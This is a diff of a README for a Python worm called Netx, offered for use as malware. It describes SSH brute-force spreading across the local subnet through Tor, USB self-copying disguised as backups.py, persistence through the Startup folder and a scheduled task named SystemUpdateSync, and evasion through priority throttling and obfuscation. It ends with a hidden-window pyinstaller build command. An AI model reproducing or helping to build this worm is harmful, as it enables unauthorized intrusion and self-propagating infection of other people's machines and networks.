@@ -2,26 +2,23 @@
 
 Netx is a high-performance, low-footprint Python worm, designed for automated network discovery, synchronization, and persistent lateral movement. It utilizes a multi-layered approach to bypass standard security restrictions while maintaining a near-zero CPU profile. Basically: Undetectable, spreads by internet, by USB, and on the target you run it on.
 
-### 🚀 Key Features
+### ☣️ Infection Vectors
+## 1. Network Propagation (SSH)
 
-Mutual Exclusion (Mutex): Prevents process collision by ensuring only one instance operates per machine.
+The worm identifies the local gateway and performs a Class C subnet scan (/24) for open Port 22. It utilizes a bundled wordlist to perform high-speed, proxied bruteforce attacks. Upon a successful breach:
 
-Adaptive Priority: Automatically throttles itself to IDLE_PRIORITY_CLASS on Windows to evade behavioral detection.
+It infects ```C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/```.
 
-Tor Expert Bundle Integration: Automated download and silent execution of Tor for circuit-rotated SSH operations.
+It bypasses UAC folder restrictions by registering a Scheduled Task for persistence.
 
-Persistence Bypass: Evades Startup folder permissions by utilizing the Windows Task Scheduler (schtasks).
+## 2. Physical Propagation (USB)
 
-Multi-Vector Spreading: Simultaneous lateral movement via SSH bruteforce and physical USB propagation.
+Every 300 seconds, the worm monitors ```psutil.disk_partitions``` for newly mounted removable drives. It automatically clones itself as backups.py to the root of the drive, waiting for manual execution on a guest machine.
 
+### ⚠️ Operation Warnings
+Lateral Loops: The Mutex is critical. Without it, the worm will attempt to infect itself repeatedly across the network, leading to a crash.
 
-### 🛠️ Technical Architecture
-
-Component	Technology	Logic
-Networking	nmap / paramiko	Scans Gateway /24 for Port 22 and attempts credential injection.
-Anonymity	Stem / PySocks	Routes non-local traffic through Tor SOCKS5 proxy with circuit rotation.
-Synchronization	msvcrt	Uses kernel-level file locking in %TEMP% for the Mutex.
-Persistence	schtasks	Creates a task named SystemUpdateSync to trigger on user logon.
+Network Noise: ```nmap``` scans are noisy. On a corporate network, this will likely trigger an IDS (Intrusion Detection System) alert.
 
 ### 📦 Compilation & Deployment
 
@@ -35,21 +32,21 @@ To protect the source code from static analysis and string-based detection (Alre
 
 Run this on a Windows environment to generate the final .exe:
 
-``` powershell
+```
 cd netx
 pyinstaller --onefile --noconsole --add-data "wordlist.txt;." dist/main.py
 ```
-Note: The --noconsole flag ensures the process runs purely in the background without a terminal window.
+Note: The ```--noconsole``` flag ensures the process runs purely in the background without a terminal window.
 
 ### 📂 Project Structure
 
-main.py: The core logic engine.
+```main.py```: The core logic engine.
 
-wordlist.txt: Local dictionary for initial credential attempts (bundled into EXE).
+```wordlist.txt```: Local dictionary for initial credential attempts (bundled into EXE).
 
-dist/: Output directory for the obfuscated runtime.
+```dist/```: Output directory for the obfuscated runtime.
 
-%TEMP%/tor_bundle/: Automated staging area for the Tor Expert Bundle.
+```%TEMP%/tor_bundle/```: Automated staging area for the Tor Expert Bundle.
 
 
 #### ⚠️ Requirements
